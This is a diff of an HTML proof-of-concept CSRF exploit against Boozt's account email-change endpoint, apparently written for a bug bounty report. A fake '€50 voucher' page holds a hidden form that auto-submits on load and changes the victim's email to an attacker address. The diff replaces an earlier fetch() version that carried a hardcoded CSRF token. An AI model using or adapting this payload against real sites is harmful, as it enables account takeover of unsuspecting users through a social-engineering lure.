@@ -9,21 +9,15 @@
     <h1>Congratulations!</h1>
     <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
 
+    <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
+        style="display:none;">
+        <input type="hidden" name="email" value="attacker@wearehackerone.com">
+        <input type="submit" value="Claim">
+    </form>
+
     <script>
-        // Fetch CSRF token from meta tag or cookie, then send request
-        fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Csrf-Token': '8e56aaf11e82a339a91111ff475ecd74'  // From your Burp request
-            },
-            credentials: 'include',
-            body: '{"email":"=", "email":"attacker+extratest5@wearehackerone.com"}'
-        })
-            .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch(error => console.error('Error:', error));
+        // Auto-submit the form - bypasses CORS
+        document.getElementById('exploit-form').submit();
     </script>
 </body>
 
